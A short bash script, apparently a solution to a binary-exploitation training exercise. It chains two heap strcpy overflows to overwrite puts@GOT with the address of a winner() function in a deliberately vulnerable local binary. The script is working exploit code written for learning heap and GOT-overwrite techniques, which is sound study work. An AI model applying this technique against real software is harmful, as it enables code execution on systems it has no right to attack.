#!/usr/bin/env bash
# ex11 — Two heap strcpy's chained into an arbitrary GOT write
# argv[1] overflows a->next into b->next, setting b->next = &puts@got (0x08049774).
# argv[2] then writes through b->next, placing &winner (0x08048494) into puts@got.
# The final puts("and that's a wrap") call becomes winner().

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex11 — chain two heap strcpy's to overwrite puts@GOT with &winner"
echo "[*] winner()  : $(nm "$BIN" | awk '/ T winner$/{print $1}')"
echo "[*] puts@GOT  : $(objdump -R "$BIN" | awk '/puts/{print $1}')"
echo ""

"$BIN" \
  "$(python3 -c "import sys, struct; sys.stdout.buffer.write(b'A'*16 + b'BBBB' + struct.pack('<I', 0x08049774))")" \
  "$(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0x08048494))")"

echo ""
echo "[*] done."
